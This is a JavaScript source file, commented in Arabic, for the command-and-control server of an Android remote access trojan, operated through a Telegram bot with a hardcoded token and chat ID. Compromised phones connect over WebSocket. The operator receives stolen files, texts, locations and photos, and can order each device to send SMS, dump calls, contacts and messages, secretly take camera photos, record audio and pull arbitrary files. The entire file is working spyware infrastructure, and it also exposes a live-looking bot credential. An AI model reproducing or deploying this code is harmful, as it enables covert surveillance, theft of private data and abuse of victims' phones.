const express = require('express');
const WebSocket = require('ws'); 
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const id = '7604667042';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const bot = new TelegramBot(token, {
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

const clients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';

// Routes
app.get('/', (req, res) => {
    res.send('<h1 align="center">✅ النظام يعمل</h1>');
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    const model = req.headers.model || 'Unknown';
    
    bot.sendDocument(id, req.file.buffer, {
        caption: `📁 ملف من: <b>${model}</b>\n📄 ${filename}`,
        parse_mode: 'HTML'
    }, { filename: filename, contentType: 'application/octet-stream' });
    
    res.send('');
});

app.post('/uploadText', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendMessage(id, `📝 رسالة من: <b>${model}</b>\n\n${req.body.text}`, { parse_mode: 'HTML' });
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendLocation(id, req.body.lat, req.body.lon);
    bot.sendMessage(id, `📍 موقع من: <b>${model}</b>`, { parse_mode: 'HTML' });
    res.send('');
});

app.post('/uploadImage', upload.single('image'), (req, res) => {
    const model = req.headers.model || 'Unknown';
    const cameraType = req.headers.camera_type || 'Unknown';
    
    bot.sendPhoto(id, req.file.buffer, {
        caption: `📸 صورة من: <b>${model}</b>\n🎯 ${cameraType}`,
        parse_mode: 'HTML'
    });
    
    res.send('');
});

// WebSocket Connection
wss.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';
    
    ws.uuid = uuid;
    clients.set(uuid, { 
        model, 
        battery, 
        version, 
        brightness, 
        provider,
        connection: ws
    });
    
    console.log(`✅ جهاز متصل: ${model}`);
    
    bot.sendMessage(id, 
        `🆕 جهاز جديد متصل\n\n` +
        `📱 <b>${model}</b>\n` +
        `🔋 <b>${battery}%</b>\n` +
        `🤖 <b>${version}</b>\n` +
        `🆔 <code>${uuid}</code>`, 
        { parse_mode: 'HTML' }
    );
    
    // إرسال ping كل 30 ثانية للحفاظ على الاتصال
    const pingInterval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send('ping');
        }
    }, 30000);
    
    ws.on('close', () => {
        clearInterval(pingInterval);
        console.log(`❌ انقطع: ${model}`);
        bot.sendMessage(id, `❌ انقطع: <b>${model}</b>`, { parse_mode: 'HTML' });
        clients.delete(uuid);
    });
    
    ws.on('error', (error) => {
        console.error(`❌ خطأ: ${error}`);
        clearInterval(pingInterval);
    });
});

// معالجة رسائل البوت - مبسطة
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (chatId.toString() !== id) {
        return;
    }
    
    console.log(`📩 أمر: ${text}`);
    
    // معالجة الردود
    if (msg.reply_to_message) {
        handleReplyMessage(msg);
        return;
    }
    
    // الأوامر الرئيسية
    if (text === '/start') {
        showMainMenu();
    }
    else if (text === '📱 الأجهزة') {
        showConnectedDevices();
    }
    else if (text === '⚙️ الأوامر') {
        showCommandsList();
    }
    else if (text === '🔄 تحديث') {
        showConnectedDevices();
    }
});

function handleReplyMessage(msg) {
    const replyText = msg.reply_to_message.text;
    const userText = msg.text;
    
    if (!currentUuid) {
        bot.sendMessage(id, '❌ حدد الجهاز أولاً');
        return;
    }
    
    // إرسال الأوامر مباشرة للتطبيق
    if (replyText.includes('أدخل الرقم')) {
        currentNumber = userText;
        bot.sendMessage(id, '📝 أدخل الرسالة:', { 
            reply_markup: { force_reply: true } 
        });
    }
    else if (replyText.includes('أدخل الرسالة')) {
        sendCommand(currentUuid, `sms:${currentNumber}:${userText}`);
        showMainMenu('✅ تم الإرسال');
    }
    else if (replyText.includes('رسالة للجميع')) {
        sendCommand(currentUuid, `sms_all:${userText}`);
        showMainMenu('✅ تم الإرسال');
    }
    else if (replyText.includes('مسار الملف')) {
        sendCommand(currentUuid, `get_file:${userText}`);
        showMainMenu('✅ جاري الجلب');
    }
    else if (replyText.includes('مدة التسجيل')) {
        sendCommand(currentUuid, `record_audio:${userText}`);
        showMainMenu('🎤 جاري التسجيل');
    }
    else if (replyText.includes('عدد الصور')) {
        sendCommand(currentUuid, `take_photos:${userText}`);
        showMainMenu('📸 جاري الالتقاط');
    }
}

// ⭐⭐ الدالة الأساسية لإرسال الأوامر
function sendCommand(uuid, command) {
    const device = clients.get(uuid);
    if (device && device.connection.readyState === WebSocket.OPEN) {
        device.connection.send(command);
        console.log(`✅ أمر مرسل: ${command} إلى ${uuid}`);
        return true;
    } else {
        console.log(`❌ فشل إرسال: ${command} - الجهاز غير متصل`);
        bot.sendMessage(id, '❌ الجهاز غير متصل حالياً');
        return false;
    }
}

// معالجة Callback Queries - الأوامر الأساسية فقط
bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    
    console.log(`🔘 callback: ${data}`);
    
    try {
        const [action, uuid] = data.split(':');
        const device = clients.get(uuid);
        
        if (!device) {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ الجهاز غير متصل' });
            return;
        }
        
        bot.answerCallbackQuery(callbackQuery.id);
        
        if (action === 'device') {
            showDeviceCommands(message, uuid, device);
        }
        else if (action === 'info') {
            sendCommand(uuid, 'get_info');
            bot.deleteMessage(id, message.message_id);
            showMainMenu('📊 جاري جمع المعلومات');
        }
        else if (action === 'sms') {
            currentUuid = uuid;
            bot.deleteMessage(id, message.message_id);
            bot.sendMessage(id, '📱 أدخل الرقم:', { 
                reply_markup: { force_reply: true } 
            });
        }
        else if (action === 'calls') {
            sendCommand(uuid, 'get_calls');
            bot.deleteMessage(id, message.message_id);
            showMainMenu('📞 جاري الجلب');
        }
        else if (action === 'contacts') {
            sendCommand(uuid, 'get_contacts');
            bot.deleteMessage(id, message.message_id);
            showMainMenu('👥 جاري الجلب');
        }
        else if (action === 'messages') {
            sendCommand(uuid, 'get_messages');
            bot.deleteMessage(id, message.message_id);
            showMainMenu('💬 جاري الجلب');
        }
        else if (action === 'location') {
            sendCommand(uuid, 'get_location');
            bot.deleteMessage(id, message.message_id);
            showMainMenu('📍 جاري الموقع');
        }
        else if (action === 'camera_front') {
            sendCommand(uuid, 'take_photo:front');
            bot.deleteMessage(id, message.message_id);
            showMainMenu('📸 جاري الالتقاط');
        }
        else if (action === 'camera_back') {
            sendCommand(uuid, 'take_photo:back');
            bot.deleteMessage(id, message.message_id);
            showMainMenu('📷 جاري الالتقاط');
        }
        else if (action === 'record_audio') {
            currentUuid = uuid;
            bot.deleteMessage(id, message.message_id);
            bot.sendMessage(id, '🎤 المدة بالثواني:', { 
                reply_markup: { force_reply: true } 
            });
        }
        else if (action === 'files') {
            currentUuid = uuid;
            bot.deleteMessage(id, message.message_id);
            bot.sendMessage(id, '📁 مسار الملف:', { 
                reply_markup: { force_reply: true } 
            });
        }
        else if (action === 'toast') {
            currentUuid = uuid;
            bot.deleteMessage(id, message.message_id);
            bot.sendMessage(id, '🔔 نص التنبيه:', { 
                reply_markup: { force_reply: true } 
            });
        }
        else if (action === 'vibrate') {
            sendCommand(uuid, 'vibrate');
            bot.deleteMessage(id, message.message_id);
            showMainMenu('📳 جاري الاهتزاز');
        }
        
    } catch (error) {
        console.error('❌ خطأ:', error);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ حدث خطأ' });
    }
});

// الدوال المساعدة
function showMainMenu(text = 'اختر من القائمة:') {
    bot.sendMessage(id, text, {
        reply_markup: {
            keyboard: [
                ['📱 الأجهزة', '⚙️ الأوامر'],
                ['🔄 تحديث']
            ],
            resize_keyboard: true
        }
    });
}

function showConnectedDevices() {
    if (clients.size === 0) {
        bot.sendMessage(id, '❌ لا توجد أجهزة متصلة');
        return;
    }
    
    let devicesText = `📱 الأجهزة المتصلة (${clients.size}):\n\n`;
    
    clients.forEach((device, uuid) => {
        devicesText += 
            `📱 ${device.model}\n` +
            `🔋 ${device.battery}% | 🤖 ${device.version}\n` +
            `🆔 ${uuid}\n\n`;
    });
    
    bot.sendMessage(id, devicesText, {
        reply_markup: {
            inline_keyboard: [[
                { text: '🔄 تحديث', callback_data: 'refresh' },
                { text: '⚙️ الأوامر', callback_data: 'show_commands' }
            ]]
        }
    });
}

function showCommandsList() {
    if (clients.size === 0) {
        bot.sendMessage(id, '❌ لا توجد أجهزة متصلة');
        return;
    }
    
    const deviceButtons = [];
    clients.forEach((device, uuid) => {
        deviceButtons.push([{
            text: `📱 ${device.model} (${device.battery}%)`,
            callback_data: `device:${uuid}`
        }]);
    });
    
    bot.sendMessage(id, '🔘 اختر الجهاز:', {
        reply_markup: { inline_keyboard: deviceButtons }
    });
}

function showDeviceCommands(message, uuid, device) {
    const keyboard = [
        [
            { text: '📊 معلومات', callback_data: `info:${uuid}` },
            { text: '📍 موقع', callback_data: `location:${uuid}` }
        ],
        [
            { text: '📞 مكالمات', callback_data: `calls:${uuid}` },
            { text: '💬 رسائل', callback_data: `messages:${uuid}` }
        ],
        [
            { text: '👥 جهات اتصال', callback_data: `contacts:${uuid}` },
            { text: '📱 تطبيقات', callback_data: `apps:${uuid}` }
        ],
        [
            { text: '📨 إرسال رسالة', callback_data: `sms:${uuid}` },
            { text: '📸 أمامية', callback_data: `camera_front:${uuid}` }
        ],
        [
            { text: '📷 خلفية', callback_data: `camera_back:${uuid}` },
            { text: '🎤 تسجيل', callback_data: `record_audio:${uuid}` }
        ],
        [
            { text: '📁 ملفات', callback_data: `files:${uuid}` },
            { text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` }
        ],
        [
            { text: '🔔 تنبيه', callback_data: `toast:${uuid}` }
        ]
    ];
    
    bot.editMessageText(
        `⚙️ أوامر الجهاز:\n📱 ${device.model}\n🔋 ${device.battery}%`,
        {
            chat_id: message.chat.id,
            message_id: message.message_id,
            reply_markup: { inline_keyboard: keyboard }
        }
    );
}

// بدء الخادم
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
    console.log('🤖 البوت جاهز...');
});

// معالجة الأخطاء
bot.on('error', (error) => {
    console.error('❌ خطأ في البوت:', error);
});

bot.on('polling_error', (error) => {
    console.error('❌ خطأ في الاتصال:', error);
});
